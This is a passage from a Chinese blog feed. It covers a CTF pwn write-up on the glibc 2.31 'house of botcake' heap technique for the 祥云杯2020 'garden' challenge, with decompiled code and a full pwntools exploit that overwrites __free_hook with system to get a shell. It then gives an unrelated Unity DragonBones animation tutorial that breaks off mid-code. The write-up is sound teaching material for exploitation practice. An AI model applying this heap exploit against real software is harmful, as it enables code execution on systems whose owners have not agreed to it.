class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br></pre></td></tr></table></figure><p><img src="image-20220615102654063.png" alt="image-20220615102654063"></p><p>于是，a chunk即在tachebins中，又和prev chunk一起在 unsortedbin 中。这样我们就完成house_of_botcake攻击。可以进而通过prev chunk 用 A chunk进行任意地址写。 </p><h2 id="例题解析-祥云杯2020-garden"><a href="#例题解析-祥云杯2020-garden" class="headerlink" title="例题解析-祥云杯2020-garden"></a>例题解析-祥云杯2020-garden</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="image-20220615221726509.png" alt="image-20220615221726509"></p><p>题目保护全开，同时是2.31版本。</p><p>分析流程，发现题目只有添加chunk，释放，显示内容，退出四种功能。</p><p>但用两种添加chunk和释放chunk的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tree index?"</span>);</span><br><span class="line">  v1 = sub_11C5();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">8</span> || qword_4060[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">  qword_4060[v1] = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tree name?"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_4060[v1], <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很平凡的添加功能，但只能申请0x100大小空间的chunk(0x110).且只能申请8个.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_4050 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"do you want to name the garden?"</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  result = <span class="built_in">puts</span>(<span class="string">"sorry, you can't"</span>);</span><br><span class="line">  dword_4050 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能调用一次的，添加功能但可以申请0x20大小空间的chunk（0x30）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tree index?"</span>);</span><br><span class="line">  v2 = sub_11C5();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">8</span> &amp;&amp; qword_4060[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_4060[v2]);</span><br><span class="line">    v0 = qword_4060;</span><br><span class="line">    qword_4060[v2] = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很常见的正常释放chunk操作，再free chunk 后，会清空指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_4054 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"which tree do you want to steal?"</span>);</span><br><span class="line">  v0 = sub_11C5();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt;= <span class="number">8</span> &amp;&amp; qword_4060[v0] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)qword_4060[v0]);</span><br><span class="line">  dword_4054 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在free chunk 后，不会清空指针。但是只能清空一次。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>我们可以，释放8个0x100chunk,让一个chunk 加入 unsorted bin 中，再利用name()函数，让 unsorted bin 大小小于0x100 。</p><p>我们再在add 8 个0x100 chunk，这时unsorted bin (小于0x100) 也不会利用。</p><p>释放 unsorted bin 后面相邻0x100 chunk（a chunk） ,并保留指针。两个chunk 合并成大的unsorted bin</p><p> chunk。</p><p>再add 一个 0x100 chunk，让  tcache 未满，再free  a chunk 这时 a chunk进入  0x100 chunk。但同时也在于unsorted bin中。形成重叠。</p><p>再利用重叠部分uaf泄露libc，再修改fd进行任意地址写，在<code>__free_hook</code>写入后门。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/06/15 16:46:39</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./garden'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,text)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'tree index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'tree name?'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'tree index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_0</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which tree do you want to steal?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'tree index?'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="string">'1111'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#free(4)</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">name()  <span class="comment">#制造0xe0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="string">'1111'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">free_0(<span class="number">2</span>) <span class="comment">#让0x100与0xe0合并制造出unsertedbin 效果</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'1'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'xx'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">''</span>)</span><br><span class="line">show(<span class="number">8</span>)<span class="comment">#泄露libc地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#传统劫持tache，任意地址写</span></span><br><span class="line">addr=(u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">malloc_hook=addr+<span class="number">0x26</span></span><br><span class="line">log.info(hex(malloc_hook))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,malloc_hook)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">'t'</span>*<span class="number">0xe0</span>+p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在2.29版本上的libc中，由于 tcache 加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>在unity中使用DragonBones骨骼的方法</title>
    <link href="lexsd6.github.io/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/"/>
    <id>lexsd6.github.io/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/</id>
    <published>2022-05-16T13:31:49.983Z</published>
    <updated>2022-05-21T12:47:12.472Z</updated>
    
    <content type="html"><![CDATA[<p>最近跑路的事情稳了，又拿出2019年设计的小游戏草案在那里改。找文章发现DragonBones骨骼可以用来unity中使用。但项目需求使用时，踩了很多坑。<a id="more"></a></p><h2 id="导入插件"><a href="#导入插件" class="headerlink" title="导入插件"></a>导入插件</h2><p>在github(<a href="https://github.com/DragonBones/DragonBonesCSharp" target="_blank" rel="noopener">https://github.com/DragonBones/DragonBonesCSharp</a>) 下载插件.</p><p>然后：</p><ol><li>创建一个 Unity 项目或使用上述示例项目。</li><li>分别复制 <a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/DragonBones/src" target="_blank" rel="noopener">DragonBones 公共库源码</a>、<a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/Unity/src" target="_blank" rel="noopener">DragonBones Unity 库源码</a>、<a href="https://github.com/DragonBones/DragonBonesCSharp/blob/master/3rdParty" target="_blank" rel="noopener">第三方库源码</a> 中的所有文件夹和文件到项目的 Assets/Scripts 文件夹下。</li><li>运行项目。</li></ol><p>确保项目结构如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Your project</span><br><span class="line">    |-- Assets</span><br><span class="line">        |-- DragonBones</span><br><span class="line">            |-- Demos (如果不需要，可以删除。)</span><br><span class="line">            |-- Scripts        </span><br><span class="line">                |-- 3rdParty</span><br><span class="line">                |-- animation</span><br><span class="line">                |-- armature</span><br><span class="line">                |-- ...</span><br><span class="line">                |-- unity</span><br><span class="line">                |-- ...</span><br><span class="line">            |-- Editor</span><br><span class="line">            |-- Resources</span><br><span class="line">                |-- Shaders files</span><br><span class="line">                |-- ...</span><br><span class="line">            |-- ...</span><br><span class="line">        |-- Resources</span><br><span class="line">            |-- DragonBonesData files</span><br><span class="line">            |-- ...</span><br><span class="line">        |-- Scripts</span><br><span class="line">        |-- ...</span><br><span class="line">    |-- ...</span><br><span class="line">&#96;&#96;&#96;-- ...</span><br></pre></td></tr></table></figure><h2 id="素材导入"><a href="#素材导入" class="headerlink" title="素材导入"></a>素材导入</h2><h3 id="图像界面导入"><a href="#图像界面导入" class="headerlink" title="图像界面导入"></a>图像界面导入</h3><p>unity图像界面导入DragonBones骨骼比较简单。分为Data数据导入和直接法。</p><h4 id="直接导入"><a href="#直接导入" class="headerlink" title="直接导入"></a>直接导入</h4><p>在插件导入后，我们就点击右键ske文件，点击DragonBones中<code>Armature Object</code>,可以生成DragonBones骨骼动画对象。</p><p><img src="image-20220520110016570.png" alt="image-20220520110016570"></p><h4 id="Data数据"><a href="#Data数据" class="headerlink" title="Data数据"></a>Data数据</h4><p>在插件导入后，我们就点击右键ske文件，点击DragonBones中<code>Create Unity Data</code>,可以生成data文件。</p><p><img src="image-20220520101926214.png" alt="image-20220520101926214"></p><p>在把文件拖入DragonBones对象里。</p><p><img src="image-20220520105643528.png" alt="image-20220520105643528"></p><h3 id="代码导入"><a href="#代码导入" class="headerlink" title="代码导入"></a>代码导入</h3><p>参照官方demo教程–<code>HelloDragonBones.cs</code>改动的，纯代码导入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">using System.Collections;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using UnityEngine;</span><br><span class="line">using DragonBones;</span><br><span class="line">public class testal : MonoBehaviour&#x2F;&#x2F;BaseDemo &#x2F;&#x2F;MonoBehaviour</span><br><span class="line">&#123;  </span><br><span class="line">    private UnityDragonBonesData dragonBoneData;</span><br><span class="line">    &#x2F;&#x2F; Update is called once per frame</span><br><span class="line">    &#x2F;&#x2F; Start is called before the first frame update</span><br><span class="line">    &#x2F;&#x2F; protected override void OnStart()</span><br><span class="line">    void Start()</span><br><span class="line">    &#123;</span><br><span class="line">        dragonBoneData&#x3D;UnityEditor.AssetDatabase.LoadAssetAtPath&lt;UnityDragonBonesData&gt;(&quot;Assets&#x2F;ylw&#x2F;xlw_Data.asset&quot;);</span><br><span class="line">        &#x2F;&#x2F; 1.Load and parse data</span><br><span class="line">       &#x2F;&#x2F; Debug.Log(dragonBoneData.dragonBonesJSON);</span><br><span class="line">        if (true)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Scheme 1: Load UnityDragonBonesData</span><br><span class="line">            UnityFactory.factory.LoadData(this.dragonBoneData);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Scheme 2: Load JsonData in Resources</span><br><span class="line">             &#x2F;&#x2F;UnityFactory.factory.LoadDragonBonesData(&quot;&#x2F;Assets&#x2F;ylw&#x2F;xlw_ske.json&quot;);</span><br><span class="line">             &#x2F;&#x2F;UnityFactory.factory.LoadTextureAtlasData(&quot;&#x2F;Assets&#x2F;ylw&#x2F;xlw_tex.json&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 2.Build armature</span><br><span class="line">        var armatureComponent &#x3D; UnityFactory.factory.BuildArmatureComponent(&quot;animx&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 3.Play animation</span><br><span class="line">        armatureComponent.animation.Play(&quot;stand&quot;);</span><br><span class="line">       </span><br><span class="line">        &#x2F;&#x2F; Set name</span><br><span class="line">        armatureComponent.name &#x3D; &quot;dynamic_mecha_1002_101d&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Set position.</span><br><span class="line"></span><br><span class="line">        armatureComponent.transform.localPosition &#x3D; new Vector3(3.0f, -1.5f, 1.0f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Update is called once per frame</span><br><span class="line">    void Update()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里要注意的是<code>UnityFactory.factory.BuildArmatureComponent()</code>函数的参数与ske文件中的<code>armature</code>属性里的<code>name</code>的值相关，两者要一致。</p><p>同时，如果是<strong>高版本素材</strong>推荐用<strong>scheme1</strong>导入，<strong>低版本</strong>用<strong>scheme2</strong>。否则，代码导入后有蜜汁bug。</p><p>另外代码导入时，确保正确生成了mat文件，否则也有蜜汁bug。官方代码里先读取文件再判断是否生成orw。。。。</p><h2 id="用代码获得骨骼动画对象"><a href="#用代码获得骨骼动画对象" class="headerlink" title="用代码获得骨骼动画对象"></a>用代码获得骨骼动画对象</h2><p>我们在导入unity后,我们可以通过UnityArmatureComponent控件来管理我们DragonBones骨骼动画。</p><p>我们可以GETcomponent来获取我们的DragonBones骨骼动画对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public DragonBones.UnityArmatureComponent anmi;</span><br><span class="line">anmi&#x3D;xxx.GetComponent&lt;DragonBones.UnityArmatureComponent&gt;();</span><br></pre></td></tr></table></figure><p>也可以直接使用拖拽法</p><p><img src="image-20220517113029077.png" alt="image-20220517113029077"></p><h2 id="用代码控制骨骼动画播放"><a href="#用代码控制骨骼动画播放" class="headerlink" title="用代码控制骨骼动画播放"></a>用代码控制骨骼动画播放</h2><p>官方提供的获得控制骨骼动画播放与播放状态属性的API，这些与播放相关的API多数放在animation属性下。</p><p>具体API简略整理如下：</p><h3 id="通过指定的动画配置来播放动画"><a href="#通过指定的动画配置来播放动画" class="headerlink" title="通过指定的动画配置来播放动画"></a>通过指定的动画配置来播放动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState PlayConfig(AnimationConfig animationConfig)</span><br></pre></td></tr></table></figure><p> 通过指定的动画配置来播放动画。 该 API 仍在实验阶段，使用时可能遭遇 bug 或稳定性或兼容性问题。</p><p>参数：</p><p><code>animationConfig</code>：是指动画配置。</p><h3 id="播放指定动画"><a href="#播放指定动画" class="headerlink" title="播放指定动画"></a>播放指定动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState Play(string animationName &#x3D; null, int playTimes &#x3D; -1)</span><br></pre></td></tr></table></figure><p>播放指定动画，并设置循环次数。</p><p>参数:</p><p><code>animationName</code>:运行动画名称。</p><p><code>playTimes</code>:循环次数  [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armature.animation.play(&quot;walk&quot;);</span><br></pre></td></tr></table></figure><h3 id="淡入播放指定的动画"><a href="#淡入播放指定的动画" class="headerlink" title="淡入播放指定的动画"></a>淡入播放指定的动画</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public AnimationState FadeIn(string animationName, float fadeInTime &#x3D; -1.0f, int playTimes &#x3D; -1,</span><br><span class="line">                                  int layer &#x3D; 0, string group &#x3D; null,</span><br><span class="line">                                  AnimationFadeOutMode fadeOutMode &#x3D; AnimationFadeOutMode.SameLayerAndGroup)</span><br></pre></td></tr></table></figure><p><code>FadeIn()</code>淡入播放指定的动画。</p><p>参数：</p><p><code>animationName</code>：动画数据名称。</p><p> <code>fadeInTime</code>:淡入时间。 [-1: 使用动画数据默认值, [0~N]: 淡入时间 (以秒为单位)] （默认: -1）</p><p><code>playTimes</code>: 播放次数。 [-1: 使用动画数据默认值, 0: 无限循环播放, [1~N]: 循环播放 N 次] （默认: -1）</p><p><code>layer</code>:混合图层，图层高的动画状态会优先获取混合权重，当混合权重分配总和超过 1.0 时，剩余的动画状态将不能再获得权重分配。 （默认: 0）</p><p><code>group</code> 混合组名称，该属性通常用来指定多个动画状态混合时的相互替换关系。 （默认: null）</p><p><code>fadeOutMode</code>:淡出模式，该属性通常用来指定多个动画状态混合时的相互替换模式。 （默认: <code>AnimationFadeOutMode.SameLayerAndGroup</code>）</p><p>返回值：</p><p>播放的状态。</p><p>PS:淡出模式的具体模式有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AnimationFadeOutMode.None &#x2F;&#x2F;不淡出任何的动画状态，值同等于0   </span><br><span class="line">    </span><br><span class="line">AnimationFadeOutMode.SameLayer &#x2F;&#x2F;淡出同层的动画状态，值同等于1</span><br><span class="line">    </span><br><span class="line">AnimationFadeOutMode.SameGroup&#x2F;&#x2F; 淡出同组的动画状态，值同等于2</span><br><span class="line"></span><br><span 